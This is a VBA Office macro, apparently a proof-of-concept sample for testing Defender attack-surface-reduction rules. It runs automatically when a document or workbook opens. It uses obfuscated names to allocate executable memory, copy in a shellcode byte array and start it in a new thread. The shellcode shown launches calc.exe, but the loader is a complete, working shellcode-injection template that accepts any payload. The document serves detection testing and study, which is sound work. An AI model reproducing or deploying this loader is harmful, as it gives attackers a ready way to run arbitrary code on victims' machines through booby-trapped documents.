REM 运行计算器
REM https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office

#If Vba7 Then
    Private Declare PtrSafe Function Create Lib "kernel32"  Alias "CreateThread" (ByVal Plw As Long, ByVal Bxzjkhnm As Long, ByVal Grmeywgct As LongPtr, Rirsi As Long, ByVal Puh As Long, Uxbkmiu As Long) As LongPtr
    Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Bgsndokwj As Long, ByVal Nmni As Long, ByVal Oobnx As Long, ByVal Ioioyh As Long) As LongPtr
    Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Vhzrnxtai As LongPtr, ByRef Ihfu As Any, ByVal Zkph As Long) As LongPtr
#Else
    Private Declare Function Create Lib "kernel32" Alias "CreateThread"  (ByVal Plw As Long, ByVal Bxzjkhnm As Long, ByVal Grmeywgct As Long, Rirsi As Long, ByVal Puh As Long, Uxbkmiu As Long) As Long
    Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Bgsndokwj As Long, ByVal Nmni As Long, ByVal Oobnx As Long, ByVal Ioioyh As Long) As Long
    Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Vhzrnxtai As Long, ByRef Ihfu As Any, ByVal Zkph As Long) As Long
#EndIf

Sub Auto_Open()
    Dim Qgvx As Long, Cdeokfqii As Variant, Zuszlsq As Long
#If Vba7 Then
    Dim  Slut As LongPtr, Lytcsql As LongPtr
#Else
    Dim  Slut As Long, Lytcsql As Long
#EndIf
    Cdeokfqii = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _
207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,106,1,141,133,178,0,0,0,80,104,49,139,111,135,255,213,187,240,181,162,86,104,166,149, _
189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213,99,97,108,99,46,101,120,101,0)

    Slut = VirtualAlloc(0, UBound(Cdeokfqii), &H1000, &H40)
    For Zuszlsq = LBound(Cdeokfqii) To UBound(Cdeokfqii)
        Qgvx = Cdeokfqii(Zuszlsq)
        Lytcsql = RtlMoveMemory(Slut + Zuszlsq, Qgvx, 1)
    Next Zuszlsq
    Lytcsql = Create(0, 0, Slut, 0, 0, 0)
End Sub
Sub AutoOpen()
    Auto_Open
End Sub
Sub Workbook_Open()
    Auto_Open
End Sub
